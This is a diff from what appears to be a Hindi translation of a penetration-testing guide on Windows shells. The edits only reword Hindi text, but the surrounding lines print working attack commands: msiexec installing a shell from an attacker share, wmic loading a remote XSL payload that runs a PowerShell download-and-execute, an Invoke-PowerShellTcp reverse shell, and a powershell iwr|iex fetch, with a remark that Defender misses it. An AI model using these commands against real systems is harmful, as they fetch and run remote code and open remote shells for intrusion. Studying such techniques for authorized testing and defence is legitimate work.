@@ -326,7 +326,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-उदाहरण xsl फ़ाइल [यहाँ से](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+उदाहरण xsl फ़ाइल [यहां से](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -338,7 +338,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 </ms:script>
 </stylesheet>
 ```
-**नहीं पता चला**
+**नहीं मिला**
 
 **आप बहुत आसानी से stager wmic का उपयोग करके Koadic ज़ोंबी डाउनलोड और निष्पादित कर सकते हैं**
 
@@ -399,7 +399,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender इसे दुर्भावनापूर्ण कोड के रूप में पहचानता नहीं है (अभी तक, 3/04/2019)।
+Defender इसे दुर्भावनापूर्ण कोड के रूप में पहचानता नहीं है (अभी, 3/04/2019)।
 
 **TODO: अन्य nishang शेल की जांच करें**
 
